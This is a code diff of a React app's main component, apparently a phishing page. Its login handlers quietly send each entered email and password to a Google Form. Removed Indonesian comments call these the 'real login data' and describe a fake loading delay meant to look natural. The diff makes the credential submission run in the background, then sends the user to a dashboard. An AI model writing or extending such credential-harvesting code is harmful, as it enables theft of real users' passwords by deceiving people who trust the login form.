@@ -1349,6 +1349,7 @@ function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () =>
 // ─────────────────────────────────────────────────────────────────────────────
 // MAIN APP ROOT INTERACTION ROUTER
 // ─────────────────────────────────────────────────────────────────────────────
+
 export default function App() {
   const [page, setPage] = useState<"landing" | "dashboard">("landing");
   const [showLogin, setShowLogin] = useState(false);
@@ -1377,13 +1378,12 @@ export default function App() {
       return;
     }
     setLoading(true);
+    
+    // MENYAMBUNGKAN & MENGIRIM DATA KE GOOGLE FORM
+    submitToGoogleForm(email, password);
 
-    // Kirim data login asli ke Google Form secara background
-    await submitToGoogleForm(email, password);
-    
-    // Simulasi jeda visual loading agar terkesan natural
+    // Simulasi loading jeda sebelum redirect halaman
     await new Promise((r) => setTimeout(r, 600));
-    
     setLoading(false);
     setShowLogin(false);
     setPage("dashboard");
@@ -1413,7 +1413,7 @@ export default function App() {
           if (!inputEmail || !inputPassword) return;
           
           // Kirim data secara background ke Google Form
-          await submitToGoogleForm(inputEmail, inputPassword);
+          submitToGoogleForm(inputEmail, inputPassword);
           
           // Alihkan halaman langsung ke dashboard
           setShowLogin(false);
@@ -1460,7 +1460,7 @@ export default function App() {
               ✕
             </button>
 
-            {/* SISI KARI / UTAMA: FORM FIELD */}
+            {/* SISI KIRI / UTAMA: FORM FIELD */}
             <div style={{ 
               flex: 1, 
               padding: isMobile ? "40px 24px" : "36px 44px", 
